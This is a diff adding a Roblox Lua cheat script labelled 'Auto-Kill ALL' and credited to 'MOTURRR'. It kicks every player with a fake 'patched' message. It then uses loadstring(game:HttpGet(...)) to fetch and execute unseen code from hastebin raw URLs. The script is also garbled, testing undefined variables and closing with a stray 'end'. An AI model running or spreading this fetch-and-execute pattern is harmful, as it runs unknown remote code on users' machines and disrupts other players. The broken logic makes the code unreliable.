@@ -1,0 +1,29 @@
+local Banned = NONE -- Your Username Could Be Here If You Steal Any Script
+local Patched = true -- Checks If Script Is Patched, Or Not
+if Patched == true then -- Dont Remove Any Of The Script Below (If You Do You Have A High Risk Of Getting Banned)
+    for index, player in pairs(game.Players:GetPlayers()) do
+    player:Kick("This Script Is Patched, And Bannable. Please Wait For Devs TO Fix!| Estimated Time Until Unpatched: 24hrs") -- This Kicks The Player
+end
+end
+if Karma == Dark then
+    game:GetService("StarterGui"):SetCore("SendNotification",{Title="Made By: MOTURRR",Text="Auto-Kill ALL: Enabled | Karma Mode: Dark",Duration=99999})
+    loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/vigenahuje",true))()
+end
+if Karma == Light then
+    game:GetService("StarterGui"):SetCore("SendNotification",{Title="Made By: MOTURRR",Text="Auto-Kill ALL: Enabled | Karma Mode: Light",Duration=99999})
+    loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/wayumucoda",true))()
+end
+-- Credits To Idk Who Created Autofarm
+if Karma == MOTURRR then
+    game:GetService("StarterGui"):SetCore("SendNotification",{Title="Made By: MOTURRR",Text="Auto-Kill ALL: Enabled | Karma Mode: MOTURRR",Duration=99999})
+    loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/vigenahuje",true))()
+    local Mode = MOTURRR
+    local SendScript = SendKarma.False
+    if SendScript == SendKarma.True then
+    end
+else
+    if SendScript == SendKarma.False then
+        print("Sent.Script")
+    end
+end
+end
